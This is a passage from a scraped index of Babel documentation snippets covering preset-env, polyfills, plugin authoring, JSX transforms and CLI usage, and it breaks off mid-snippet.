`Map` in `b.js`.  When `useBuiltIns: 'usage'` is enabled, Babel will inject the necessary core-js polyfill if `Map` is not natively supported by the target environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_11\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar b = new Map();\n```\n\n----------------------------------------\n\nTITLE: Migrate to Default Export in Babel Plugin (JS)\nDESCRIPTION: This code shows the modern way of defining a Babel plugin using a default export. It encapsulates the plugin's `name` and `visitor` within a single exported object, addressing the deprecation of named exports for plugin properties.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_80\n\nLANGUAGE: javascript\nCODE:\n```\nexport default {\n  name: \"babel-plugin\",\n  visitor: {\n    Identifier() {}\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring the Env Preset in .babelrc\nDESCRIPTION: Shows how to configure the `env` preset in the `.babelrc` configuration file. Using this preset allows Babel to target specific environments, compiling only the necessary transformations.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-10-31-setting-up-babel-6.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  \"presets\": [\"env\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Function Bind Syntax Examples JavaScript\nDESCRIPTION: Illustrates the function bind syntax (::) and its equivalent JavaScript using `.bind()` and `.call()`.  Demonstrates binding to an object and calling with an object and a value.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-function-bind.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nobj::func;\n// is equivalent to:\nfunc.bind(obj)\n\n::obj.func;\n// is equivalent to:\nobj.func.bind(obj);\n\nobj::func(val);\n// is equivalent to:\nfunc\n  .call(obj, val)\n\n::obj.func(val);\n// is equivalent to:\nobj.func.call(obj, val);\n```\n\n----------------------------------------\n\nTITLE: Preset Env Plugin Configuration (Diff)\nDESCRIPTION: Illustrates how to configure `@babel/preset-env` to include class properties when using legacy decorators. The `include` option enables the `@babel/plugin-transform-class-properties` transform, ensuring compatibility.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-decorators.md#_snippet_9\n\nLANGUAGE: Diff\nCODE:\n```\n{\n  \"presets\": [\n    [\"@babel/preset-env\", {\n+     \"include\": [\n+       \"@babel/plugin-transform-class-properties\"\n+     ]\n    }],\n  ],\n  \"plugins\": [\n-   \"@babel/plugin-transform-class-properties\",\n    [\"@babel/plugin-proposal-decorators\", { \"version\": \"legacy\" }]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Simple Class Decorator (JavaScript)\nDESCRIPTION: Demonstrates a simple class decorator that adds a property to the target class.  The `@annotation` decorator calls the `annotation` function, which modifies the `target` (the class itself).  The `target.annotated` property is set to `true`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-proposal-decorators.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n@annotation\nclass MyClass {}\n\nfunction annotation(target) {\n  target.annotated = true;\n}\n```\n\n----------------------------------------\n\nTITLE: Import core-js/stable in JavaScript (alternative)\nDESCRIPTION: This JavaScript snippet imports 'core-js/stable'. It should be used in the main entry file when 'useBuiltIns' is set to 'entry' in the Babel configuration. This ensures all necessary polyfills are included in the application.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_17\n\nLANGUAGE: JavaScript\nCODE:\n```\n import \"core-js/stable\";\n```\n\n----------------------------------------\n\nTITLE: Transforming Code Synchronously (Example)\nDESCRIPTION: Presents an example of using `babel.transformSync` to transform code and accessing the transformed code, source map, and AST from the result object.  The function takes code and options. It highlights the synchronous nature of the transformation.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar result = babel.transformSync(\"code();\", options);\nresult.code;\nresult.map;\nresult.ast;\n```\n\n----------------------------------------\n\nTITLE: Babel Assert Version Function\nDESCRIPTION: This snippet uses `api.assertVersion` to declare the minimum supported Babel version in the config file. This prevents the config from being used with incompatible Babel versions.\nSOURCE: https://github.com/babel/website/blob/main/docs/config-files.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = function(api) {\n  api.assertVersion(\"^7.2\");\n\n  return {\n    // ...\n  };\n};\n```\n\n----------------------------------------\n\nTITLE: Spread Operator in JavaScript\nDESCRIPTION: Demonstrates the spread operator in ES2015, which allows expanding an iterable (e.g., an array) into individual elements. This is useful for passing array elements as arguments to a function.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction f(x, y, z) {\n  return x + y + z;\n}\n// Pass each elem of array as argument\nf(...[1,2,3]) == 6\n```\n\n----------------------------------------\n\nTITLE: Specifying Browser Targets in package.json\nDESCRIPTION: This example shows how to define browser targets using the browserslist property in package.json. It targets browsers with more than 0.25% market share and excludes dead browsers. This configuration is an alternative to using a separate .browserslistrc file.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{ \"browserslist\": \"> 0.25%, not dead\" }\n```\n\n----------------------------------------\n\nTITLE: Configuring @babel/preset-env with useBuiltIns and corejs\nDESCRIPTION: This configuration demonstrates how to use @babel/preset-env with the `useBuiltIns` option set to \"entry\" and specifying the `corejs` version.  This setup configures Babel to include only the necessary polyfills based on the target environment specified elsewhere (e.g., in a .browserslistrc file).\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"presets\": [\n    [\n      \"@babel/preset-env\",\n      {\n        \"useBuiltIns\": \"entry\",\n        \"corejs\": \"3.22\"\n      }\n    ]\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Transforming a File Synchronously (Example)\nDESCRIPTION: Presents an example of using `babel.transformFileSync` to transform a file and accessing the transformed code from the result object. The function takes the filename and options.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabel.transformFileSync(\"filename.js\", options).code;\n```\n\n----------------------------------------\n\nTITLE: Object Rest Properties in JavaScript\nDESCRIPTION: Demonstrates the use of object rest properties to extract specific properties from an object, assigning the remaining properties to a new object.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-rest-spread.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet { x, y, ...z } = { x: 1, y: 2, a: 3, b: 4 };\nconsole.log(x); // 1\nconsole.log(y); // 2\nconsole.log(z); // { a: 3, b: 4 }\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel-loader in webpack\nDESCRIPTION: This snippet shows how to configure babel-loader within a webpack configuration file. It specifies the test condition to match JavaScript files, excludes the node_modules directory, and sets the loader to 'babel-loader' with the '@babel/preset-env' preset.\nSOURCE: https://github.com/babel/website/blob/main/website/data/tools/webpack/usage.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n{\n  module: {\n    rules: [\n      {\n        test: /\\.m?js$/,\n        exclude: /node_modules/,\n        use: {\n          loader: \"babel-loader\",\n          options: {\n            presets: ['@babel/preset-env']\n          }\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: JavaScript Plugin Configuration Example\nDESCRIPTION: This Javascript snippet illustrates how plugins are merged, with a specific plugin's options being replaced if the same plugin is defined in both the base configuration and an overrides configuration. It results in the plugin using the configuration specified in the overrides section, while other plugins from the base configuration are retained.\nSOURCE: https://github.com/babel/website/blob/main/docs/configuration.md#_snippet_10\n\nLANGUAGE: javascript\nCODE:\n```\nplugins: [\n  './other',\n  ['./plug', { thing: false, field2: true }],\n],\n```\n\n----------------------------------------\n\nTITLE: Transforming Code Asynchronously (Promise Example)\nDESCRIPTION: Demonstrates how to use `babel.transformAsync` to transform code, then access the transformed code, source map, and AST from the resolved Promise. The function takes code and options and utilizes a promise to handle the asynchronous result.\nSOURCE: https://github.com/babel/website/blob/main/docs/core.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabel.transformAsync(\"code();\", options).then(result => {\n  result.code;\n  result.map;\n  result.ast;\n});\n```\n\n----------------------------------------\n\nTITLE: Object Spread Properties in JavaScript\nDESCRIPTION: Illustrates the use of object spread properties to create a new object by merging properties from existing objects.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-object-rest-spread.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet n = { x, y, ...z };\nconsole.log(n); // { x: 1, y: 2, a: 3, b: 4 }\n```\n\n----------------------------------------\n\nTITLE: React Classic Runtime Example (JSX to JS)\nDESCRIPTION: Shows the transformation of JSX to JavaScript using the classic runtime, which relies on `React.createElement`.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-react-jsx.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst profile = (\n  <div>\n    <img src=\"avatar.png\" className=\"profile\" />\n    <h3>{[user.firstName, user.lastName].join(\" \")}</h3>\n  </div>\n);\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nconst profile = React.createElement(\n  \"div\",\n  null,\n  React.createElement(\"img\", { src: \"avatar.png\", className: \"profile\" }),\n  React.createElement(\"h3\", null, [user.firstName, user.lastName].join(\" \"))\n);\n```\n\n----------------------------------------\n\nTITLE: Using @babel/plugin-syntax-flow with babel.config.json\nDESCRIPTION: Configures Babel to use the @babel/plugin-syntax-flow plugin by adding it to the \"plugins\" array in the babel.config.json file. This enables parsing of Flow syntax during Babel's compilation process.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-flow.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-flow\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Creating a Preset with Presets and Plugins in JavaScript\nDESCRIPTION: This JavaScript code snippet illustrates how to create a Babel preset that includes other presets and plugins with options. It demonstrates how to require and include existing presets and plugins and also shows how to pass options to the plugins.\nSOURCE: https://github.com/babel/website/blob/main/docs/presets.md#_snippet_3\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = () => ({\n  presets: [require(\"@babel/preset-env\")],\n  plugins: [\n    [require(\"@babel/plugin-transform-class-properties\"), { loose: true }],\n    require(\"@babel/plugin-transform-object-rest-spread\"),\n  ],\n});\n```\n\n----------------------------------------\n\nTITLE: Specifying Browser Targets with browserslist\nDESCRIPTION: This example shows how to define browser targets using a .browserslistrc file. It targets browsers with more than 0.25% market share and excludes dead browsers. This file configures which transformations and polyfills are included by @babel/preset-env.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-env.md#_snippet_2\n\nLANGUAGE: Text\nCODE:\n```\n> 0.25%\nnot dead\n```\n\n----------------------------------------\n\nTITLE: Babelrc roots configuration example\nDESCRIPTION: This snippet demonstrates the usage of the `babelrcRoots` option within a babel.config.json file to enable processing of .babelrc.json files in subpackages within a monorepo.  It ensures Babel loads configuration from packages under the `packages` directory.\nSOURCE: https://github.com/babel/website/blob/main/docs/config-files.md#_snippet_6\n\nLANGUAGE: JavaScript\nCODE:\n```\nbabelrcRoots: [\n  \".\",\n  \"packages/*\",\n],\n```\n\n----------------------------------------\n\nTITLE: Using Babel CLI\nDESCRIPTION: This command-line snippet demonstrates how to use the Babel CLI to transform a JavaScript file. It uses the `--plugins` option to specify a plugin to use during the transformation, in this case, `@babel/plugin-transform-arrow-functions`.  It takes `script.js` as input and outputs the transformed code to the console (or a specified output file).\nSOURCE: https://github.com/babel/website/blob/main/docs/configuration.md#_snippet_5\n\nLANGUAGE: sh\nCODE:\n```\nbabel --plugins @babel/plugin-transform-arrow-functions script.js\n```\n\n----------------------------------------\n\nTITLE: Create Function Type Annotation AST Node (JavaScript)\nDESCRIPTION: Creates a `FunctionTypeAnnotation` AST node using the `t.functionTypeAnnotation` builder. This node is used to represent the type annotation of a function. Parameters include type parameters, parameters, the rest parameter, and the return type.\nSOURCE: https://github.com/babel/website/blob/main/docs/types.md#_snippet_74\n\nLANGUAGE: JavaScript\nCODE:\n```\nt.functionTypeAnnotation(typeParameters, params, rest, returnType);\n```\n\n----------------------------------------\n\nTITLE: Babel Plugin Configuration JSON\nDESCRIPTION: This JSON configuration snippet shows how to configure Babel to use the `@babel/plugin-syntax-top-level-await` plugin. This configuration is added to the `plugins` array in the `babel.config.json` file.  It enables the parsing of top-level await syntax.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-syntax-top-level-await.md#_snippet_1\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-syntax-top-level-await\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Simple Plugin: Reversing Names\nDESCRIPTION: This is a simple Babel plugin that reverses the names of identifiers. It exports a function that returns an object with a visitor object. The visitor object has a method for the Identifier node type that reverses the name.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugins.md#_snippet_8\n\nLANGUAGE: javascript\nCODE:\n```\nexport default function() {\n  return {\n    visitor: {\n      Identifier(path) {\n        const name = path.node.name;\n        // reverse the name: JavaScript -> tpircSavaJ\n        path.node.name = name\n          .split(\"\")\n          .reverse()\n          .join(\"\");\n      },\n    },\n  };\n}\n```\n\n----------------------------------------\n\nTITLE: Transforming ES2015 Arrow Function with Babel (JavaScript)\nDESCRIPTION: This JavaScript snippet demonstrates Babel's ability to transform ES2015 arrow functions into equivalent ES5 code, ensuring compatibility with older browsers. It takes an ES2015 arrow function as input and outputs the corresponding ES5 function expression.\nSOURCE: https://github.com/babel/website/blob/main/docs/index.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Babel Input: ES2015 arrow function\n[1, 2, 3].map(n => n + 1);\n\n// Babel Output: ES5 equivalent\n[1, 2, 3].map(function(n) {\n  return n + 1;\n});\n```\n\n----------------------------------------\n\nTITLE: Setting Babel Assumptions\nDESCRIPTION: This example shows how to use the `assumptions` option in `babel.config.json` to inform Babel about specific characteristics of the code it's processing, potentially enabling optimizations. Here, it's informing Babel that the `iterableIsArray` assumption can be made.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_15\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"assumptions\": {\n    \"iterableIsArray\": true\n  },\n  \"presets\": [\"@babel/preset-env\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configure Babel Targets with Environment Versions in JSON\nDESCRIPTION: This JSON snippet demonstrates how to configure Babel's `targets` option by specifying minimum environment versions to support. It targets Chrome 58 and Internet Explorer 11.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_6\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"targets\": {\n    \"chrome\": \"58\",\n    \"ie\": \"11\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Basic Usage of @babel/register\nDESCRIPTION: This snippet shows the basic usage of @babel/register.  Including this line will cause any subsequent `.es6`, `.es`, `.jsx`, `.mjs`, and `.js` files required by node to be transformed by Babel.\nSOURCE: https://github.com/babel/website/blob/main/docs/register.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/register\");\n```\n\n----------------------------------------\n\nTITLE: Babel config function API example\nDESCRIPTION: This example shows the structure of a babel.config.js file that exports a function. The function receives an `api` object that exposes Babel's APIs, allowing for dynamic configuration based on various factors.\nSOURCE: https://github.com/babel/website/blob/main/docs/config-files.md#_snippet_7\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = function(api) {\n  return {};\n};\n```\n\n----------------------------------------\n\nTITLE: Ignore Files During Compilation\nDESCRIPTION: Compiles files in the `src` directory, outputting to the `lib` directory, while ignoring files matching the specified patterns (spec and test files).  The `--ignore` option allows excluding certain files from compilation.\nSOURCE: https://github.com/babel/website/blob/main/docs/cli.md#_snippet_11\n\nLANGUAGE: Shell\nCODE:\n```\nnpx babel src --out-dir lib --ignore \"src/**/*.spec.js\",\"src/**/*.test.js\"\n```\n\n----------------------------------------\n\nTITLE: Babel Config Override Example\nDESCRIPTION: This snippet showcases the usage of Babel 7's `overrides` option in `babel.config.js` to apply different compilation settings to specific files or directories. It configures `@babel/preset-env` with different targets for server-side code (Node.js) and client-side code (Chrome).  The `test` property specifies the files or directories to which the override applies.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-06-26-on-consuming-and-publishing-es2015+-packages.md#_snippet_4\n\nLANGUAGE: JavaScript\nCODE:\n```\nmodule.exports = {\n  presets: [\n    ['@babel/preset-env', {\n      targets: { node: 'current' },\n    }],\n  ],\n  overrides: [{\n    test: [\"./client-code\", \"./node_modules/package-a\"],\n    presets: [\n      ['@babel/preset-env', {\n        targets: { \"chrome\": \"60\" } },\n      ]],\n    ],\n  }],\n}\n```\n\n----------------------------------------\n\nTITLE: Wrapping TSImportType argument with TSLiteralType in Babel 8 (TS)\nDESCRIPTION: This snippet shows how the `argument` of a `TSImportType` is wrapped within a `TSLiteralType` in Babel 8. This change provides more consistent handling of literal types within the AST.  Additionally, the `typeParameters` property is renamed to `typeArguments`.\nSOURCE: https://github.com/babel/website/blob/main/docs/v8-migration-api.md#_snippet_45\n\nLANGUAGE: typescript\nCODE:\n```\nvar arr: import(\"./Array\")\n\n// AST in Babel 7\n{\n  type: \"TSImportType\",\n  argument: StringLiteral(\"./Array\")\n}\n\n// AST in Babel 8\n{\n  type: \"TSImportType\",\n  argument: {\n    type: \"TSLiteralType\",\n    literal: StringLiteral(\"./Array\")\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Importing Core-js Polyfills (v3)\nDESCRIPTION: Demonstrates how to import proposal polyfills individually from the core-js v3 package.  This is required after removing proposal polyfills from @babel/polyfill. It shows the specific import paths for various stage proposals using the 'features' subpath.\nSOURCE: https://github.com/babel/website/blob/main/docs/v7-migration.md#_snippet_1\n\nLANGUAGE: JavaScript\nCODE:\n```\n// for core-js v3:\nimport \"core-js/features/array/flat-map\";\n```\n\n----------------------------------------\n\nTITLE: Automatic Polyfilling Example\nDESCRIPTION: This JavaScript code demonstrates how Babel, with the `useBuiltIns: \"usage\"` option, automatically injects polyfill imports based on the code's usage. This example imports `core-js/modules/es6.promise` because `Promise` is used.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2018-08-27-7.0.0.md#_snippet_18\n\nLANGUAGE: JavaScript\nCODE:\n```\nimport \"core-js/modules/es6.promise\";\nvar a = new Promise();\n```\n\n----------------------------------------\n\nTITLE: Importing Default and Named Members JavaScript\nDESCRIPTION: This code snippet demonstrates how to import a default export and named exports from a module. It imports the default export as `exp`, and named exports `pi` and `e` from `lib/mathplusplus`. It depends on `lib/mathplusplus`. It outputs the value of `e^π` to the console.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_16\n\nLANGUAGE: JavaScript\nCODE:\n```\n// app.js\nimport exp, {pi, e} from \"lib/mathplusplus\";\nconsole.log(\"e^π = \" + exp(pi));\n```\n\n----------------------------------------\n\nTITLE: Configure plugin in babel.config.json\nDESCRIPTION: This JSON configuration snippet shows how to enable the @babel/plugin-transform-shorthand-properties plugin within a babel.config.json file. This is the recommended approach for configuring Babel plugins.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-shorthand-properties.md#_snippet_5\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-shorthand-properties\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Arrow Functions with Lexical `this` in JavaScript\nDESCRIPTION: Demonstrates the use of arrow functions in ES2015, highlighting their concise syntax and lexical `this` binding. It showcases expression and statement bodies, as well as how arrow functions inherit the `this` context from their surrounding code and share the 'arguments' variable of the parent function.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\n// Expression bodies\nvar odds = evens.map(v => v + 1);\nvar nums = evens.map((v, i) => v + i);\n\n// Statement bodies\nnums.forEach(v => {\n  if (v % 5 === 0)\n    fives.push(v);\n});\n\n// Lexical this\nvar bob = {\n  _name: \"Bob\",\n  _friends: [],\n  printFriends() {\n    this._friends.forEach(f =>\n      console.log(this._name + \" knows \" + f));\n  }\n};\n\n// Lexical arguments\nfunction square() {\n  let example = () => {\n    let numbers = [];\n    for (let number of arguments) {\n      numbers.push(number * number);\n    }\n\n    return numbers;\n  };\n\n  return example();\n}\n\nsquare(2, 4, 7.5, 8, 11.5, 21); // returns: [4, 16, 56.25, 64, 132.25, 441]\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration (JavaScript)\nDESCRIPTION: This JavaScript configuration file demonstrates how to use the @babel/preset-react preset within a babel.config.js file, dynamically setting the development option based on the BABEL_ENV environment variable.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-react.md#_snippet_6\n\nLANGUAGE: javascript\nCODE:\n```\nmodule.exports = {\n  presets: [\n    [\n      \"@babel/preset-react\",\n      {\n        development: process.env.BABEL_ENV === \"development\",\n      },\n    ],\n  ],\n};\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with Plugin - JSON\nDESCRIPTION: Demonstrates how to configure the @babel/plugin-transform-runtime in a babel.config.json file without any options.  This configuration will enable the plugin with its default settings.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-runtime\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration File\nDESCRIPTION: Example of a babel.config.json file configuring the Babel plugin. This configuration tells Babel to use the @babel/plugin-transform-typescript plugin when transpiling code.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-typescript.md#_snippet_3\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-typescript\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Babel Configuration with babel.config.json\nDESCRIPTION: This snippet demonstrates the basic structure of a `babel.config.json` file, which is used for project-wide Babel configurations. It shows the `presets` and `plugins` options, which are used to specify the transformations Babel should apply.\nSOURCE: https://github.com/babel/website/blob/main/docs/configuration.md#_snippet_0\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"presets\": [...],\n  \"plugins\": [...]\n}\n```\n\n----------------------------------------\n\nTITLE: Install Plugin via npm\nDESCRIPTION: This command shows how to install the @babel/plugin-transform-computed-properties plugin using npm.  The `--save-dev` flag indicates that the plugin is a development dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-computed-properties.md#_snippet_2\n\nLANGUAGE: Shell\nCODE:\n```\nnpm install --save-dev @babel/plugin-transform-computed-properties\n```\n\n----------------------------------------\n\nTITLE: Babel config caller function\nDESCRIPTION: This example shows how to use the `api.caller` within the babel config file. The configuration behavior is toggled based on the environment.\nSOURCE: https://github.com/babel/website/blob/main/docs/config-files.md#_snippet_8\n\nLANGUAGE: JavaScript\nCODE:\n```\nfunction isBabelRegister(caller) {\n  return !!(caller && caller.name === \"@babel/register\");\n}\n\nmodule.exports = function(api) {\n  const isRegister = api.caller(isBabelRegister);\n\n  return {\n    // ...\n  };\n};\n```\n\n----------------------------------------\n\nTITLE: Compiling Specific Files with Babel\nDESCRIPTION: This example demonstrates how to use the `only` option in Babel configuration to restrict Babel's processing to files in a specific directory. This ensures that only the source files in the `src` directory are compiled, excluding all other files.\nSOURCE: https://github.com/babel/website/blob/main/docs/options.md#_snippet_14\n\nLANGUAGE: JavaScript\nCODE:\n```\nonly: [\"./src\"];\n```\n\n----------------------------------------\n\nTITLE: Installing Babel packages\nDESCRIPTION: This command installs the necessary Babel packages including @babel/core, @babel/cli, and @babel/preset-env as development dependencies using npm. These packages are fundamental for transpiling modern JavaScript code to older versions.\nSOURCE: https://github.com/babel/website/blob/main/docs/usage.md#_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nnpm install --save-dev @babel/core @babel/cli @babel/preset-env\n```\n\n----------------------------------------\n\nTITLE: JavaScript Named Parameter Configuration Example\nDESCRIPTION: This Javascript snippet illustrates how to resolve conflicts when using the same plugin multiple times with different parameters by assigning each instance a unique name. This allows Babel to differentiate between the instances and apply their respective configurations correctly.\nSOURCE: https://github.com/babel/website/blob/main/docs/configuration.md#_snippet_13\n\nLANGUAGE: javascript\nCODE:\n```\nplugins: [\n  [\"./plug\", { one: true }, \"first-instance-name\"],\n  [\"./plug\", { two: true }, \"second-instance-name\"],\n];\n```\n\n----------------------------------------\n\nTITLE: Switching to Babel in Gulp\nDESCRIPTION: This snippet illustrates how to switch from the `jsx` plugin to the `babel` plugin in Gulp for JSX transformation. It involves replacing the `jsx()` call with `babel()` in the Gulp pipeline.\nSOURCE: https://github.com/babel/website/blob/main/website/blog/2015-02-23-babel-loves-react.md#_snippet_9\n\nLANGUAGE: JavaScript\nCODE:\n```\ngulp.src('views/**/*.js')\n    .pipe(babel())\n    .pipe(gulp.dest('dist'));\n```\n\n----------------------------------------\n\nTITLE: Transform instanceof Operator JavaScript\nDESCRIPTION: This example demonstrates how the `instanceof` operator is transformed by the plugin. The original JavaScript code uses the `instanceof` operator. The transformed code implements a compatibility check to handle `Symbol.hasInstance` if it's defined and present on the right-hand side of the operator, falling back to native `instanceof` if not.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-instanceof.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nfoo instanceof Bar;\n```\n\n----------------------------------------\n\nTITLE: Transform Runtime Regenerator Example (With Plugin)\nDESCRIPTION: Demonstrates how the transform-runtime plugin transforms generator functions to import the regenerator runtime from `@babel/runtime/regenerator`.  This prevents pollution of the global scope. The code relies on the `@babel/runtime/regenerator` package as a dependency.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-runtime.md#_snippet_10\n\nLANGUAGE: JavaScript\nCODE:\n```\n\"use strict\";\n\nvar _regenerator = require(\"@babel/runtime/regenerator\");\n\nvar _regenerator2 = _interopRequireDefault(_regenerator);\n\nfunction _interopRequireDefault(obj) {\n  return obj && obj.__esModule ? obj : { default: obj };\n}\n\nvar _marked = [foo].map(_regenerator2.default.mark);\n\nfunction foo() {\n  return _regenerator2.default.wrap(\n    function foo$(_context) {\n      while (1) {\n        switch ((_context.prev = _context.next)) {\n          case 0:\n          case \"end\":\n            return _context.stop();\n        }\n      }\n    },\n    _marked[0],\n    this\n  );\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring the plugin in babel.config.json\nDESCRIPTION: Demonstrates how to configure the @babel/plugin-transform-nullish-coalescing-operator in a `babel.config.json` file. This is the recommended way to use the plugin. The plugin is listed under the 'plugins' array.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-nullish-coalescing-operator.md#_snippet_3\n\nLANGUAGE: JSON\nCODE:\n```\n{\n  \"plugins\": [\"@babel/plugin-transform-nullish-coalescing-operator\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring Babel Plugins with Relative Path\nDESCRIPTION: This snippet demonstrates how to specify Babel plugins in the babel.config.json file using a relative path. This allows you to load plugins from locations outside of node_modules. The plugins option takes an array of plugin paths.\nSOURCE: https://github.com/babel/website/blob/main/docs/plugins.md#_snippet_1\n\nLANGUAGE: json\nCODE:\n```\n{\n  \"plugins\": [\"./node_modules/asdf/plugin\"]\n}\n```\n\n----------------------------------------\n\nTITLE: Installing Babel Preset React via npm\nDESCRIPTION: This command installs the @babel/preset-react package as a development dependency using npm.  This preset is required to transform React JSX syntax into JavaScript.\nSOURCE: https://github.com/babel/website/blob/main/docs/preset-react.md#_snippet_0\n\nLANGUAGE: shell\nCODE:\n```\nnpm install --save-dev @babel/preset-react\n```\n\n----------------------------------------\n\nTITLE: Transform Exponentiation Operator to Math.pow() JavaScript\nDESCRIPTION: This code snippet demonstrates how the exponentiation operator (**) is transformed into Math.pow() function calls by the @babel/plugin-transform-exponentiation-operator Babel plugin. It shows both the original code using ** and **= operators and the resulting transformed code using Math.pow().\nSOURCE: https://github.com/babel/website/blob/main/docs/plugin-transform-exponentiation-operator.md#_snippet_0\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet x = 10 ** 2;\n\nx **= 3;\n```\n\nLANGUAGE: JavaScript\nCODE:\n```\nlet x = Math.pow(10, 2);\n\nx = Math.pow(x, 3);\n```\n\n----------------------------------------\n\nTITLE: Enhanced Object Literals in JavaScript\nDESCRIPTION: Demonstrates the enhanced object literal syntax in ES2015. It covers setting the prototype using `__proto__`, shorthand assignments, method definitions, super calls, and computed property names. These features make object literals more concise and bring them closer to class declarations.\nSOURCE: https://github.com/babel/website/blob/main/docs/learn.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nvar obj = {\n    // Sets the prototype. \"__proto__\" or '__proto__' would also work.\n    __proto__: theProtoObj,\n    // Computed property name does not set prototype or trigger early error for\n    // duplicate __proto__ properties.\n    ['__proto__']: somethingElse,\n    // Shorthand for ‘handler: handler’\n    handler,\n    // Methods\n    toString() {\n     // Super calls\n     return \"d \" + super.toString();\n    },\n    // Computed (dynamic) property names\n    [ \"prop_\" + (() => 42)() ]: 42\n};\n```\n\n----------------------------------------\n\nTITLE: Parsing JavaScript Code with Babel Parser\nDESCRIPTION: This JavaScript code snippet demonstrates how to use the `@babel/parser` package to parse JavaScript code into an Abstract Syntax Tree (AST).  It shows how to configure the parser to use strict mode, allow module declarations, and enable JSX and Flow syntax through plugins. The `sourceType` option set to `module` enables parsing of ES modules.\nSOURCE: https://github.com/babel/website/blob/main/docs/parser.md#_snippet_2\n\nLANGUAGE: JavaScript\nCODE:\n```\nrequire(\"@babel/parser\").parse(\"code\", {\n  // parse in strict mode and allow module declarations\n  sourceType: \"module\",\n\n  plugins: [\n    // enable jsx and flow syntax\n    